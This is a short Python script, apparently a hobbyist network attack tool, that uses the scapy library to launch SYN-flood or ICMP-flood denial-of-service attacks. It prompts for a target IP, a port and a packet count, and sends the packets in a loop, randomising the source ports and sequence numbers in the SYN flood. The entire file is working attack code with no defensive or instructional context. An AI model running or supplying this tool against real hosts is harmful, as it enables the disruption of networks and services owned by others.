from scapy.all import *

def main():
    user_input = raw_input("Please select one of the attack type [syn,icmp]: ")
    if user_input == "icmp":
        icmpflood()
    elif user_input == "syn":
        synflood()
    else:
        print "[ERROR] Select one of the attack type !!!"

def icmpflood():
    target = DestinationIP()
    cycle = raw_input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())

def synflood():
    target = DestinationIP()
    targetPort = DestinationPort()
    cycle = raw_input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,flags="S",seq=RandShort(),ack=RandShort(),sport=RandShort()))
        
def DestinationIP():
    dstIP = raw_input("Destination IP: ")
    return dstIP
    
def DestinationPort():
    dstPort = raw_input("Destination Port: ")
    return int(dstPort)
    
main()
